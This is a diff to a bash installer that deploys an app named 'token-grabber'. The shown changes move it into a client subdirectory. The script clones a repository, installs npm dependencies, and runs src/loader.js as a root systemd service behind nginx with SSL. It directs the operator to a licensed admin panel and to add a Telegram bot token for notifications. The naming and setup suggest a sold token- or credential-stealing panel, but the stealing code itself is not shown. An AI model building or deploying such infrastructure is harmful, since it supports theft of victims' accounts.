@@ -13,6 +13,7 @@ fi
 
 REPO_URL="https://github.com/fingerprint07/oggggjses.git"
 INSTALL_DIR="/opt/token-grabber"
+APP_DIR="$INSTALL_DIR/client"
 
 set -e
 export DEBIAN_FRONTEND=noninteractive
@@ -159,7 +160,7 @@ if [ -d "$INSTALL_DIR/.git" ]; then
 else
   rm -rf "$INSTALL_DIR"
   git clone --quiet "$REPO_URL" "$INSTALL_DIR"
-  ok "App downloaded to ${CYAN}$INSTALL_DIR${NC}"
+  ok "App downloaded  →  ${CYAN}$APP_DIR${NC}"
 fi
 echo ""
 
@@ -167,7 +168,7 @@ echo ""
 # STEP 5 — npm dependencies
 # ══════════════════════════════════════════════════════════════
 echo -e "${CYAN}  [5/7]  Installing app dependencies…${NC}"
-cd "$INSTALL_DIR"
+cd "$APP_DIR"
 npm install --production --silent
 ok "Dependencies installed"
 echo ""
@@ -176,8 +177,8 @@ echo ""
 # STEP 6 — Create config.js
 # ══════════════════════════════════════════════════════════════
 echo -e "${CYAN}  [6/7]  Setting up config.js…${NC}"
-if [ ! -f "$INSTALL_DIR/config.js" ]; then
-  cat > "$INSTALL_DIR/config.js" <<'EOF'
+if [ ! -f "$APP_DIR/config.js" ]; then
+  cat > "$APP_DIR/config.js" <<'EOF'
 // ─────────────────────────────────────────────────────────────
 //  Configuration  —  edit these values, then restart the app
 // ─────────────────────────────────────────────────────────────
@@ -218,7 +219,7 @@ After=network.target mongod.service
 [Service]
 Type=simple
 User=root
-WorkingDirectory=$INSTALL_DIR
+WorkingDirectory=$APP_DIR
 ExecStart=$NODE_BIN src/loader.js
 Restart=always
 RestartSec=5
@@ -276,7 +277,7 @@ certbot --nginx -d "$DOMAIN" --non-interactive --agree-tos -m "$EMAIL" --redirec
 ok "SSL certificate installed — site is now HTTPS only"
 
 # Save ssl.json
-cat > "$INSTALL_DIR/ssl.json" <<EOF
+cat > "$APP_DIR/ssl.json" <<EOF
 {
   "domain":   "$DOMAIN",
   "certPath": "/etc/letsencrypt/live/$DOMAIN/fullchain.pem",
@@ -323,7 +324,7 @@ echo -e "         ${GREEN}https://$DOMAIN/admin${NC}"
 echo -e "         Enter your license key to activate"
 echo -e "         Set an admin password"
 echo ""
-echo -e "  ${CYAN}Step 3${NC}  Edit ${CYAN}$INSTALL_DIR/config.js${NC}  to add:"
+echo -e "  ${CYAN}Step 3${NC}  Edit ${CYAN}$APP_DIR/config.js${NC}  to add:"
 echo -e "         • Telegram bot token  (for notifications)"
 echo -e "         • MongoDB URI         (default is fine)"
 echo -e "         Then run:  ${CYAN}sudo systemctl restart mail-client${NC}"
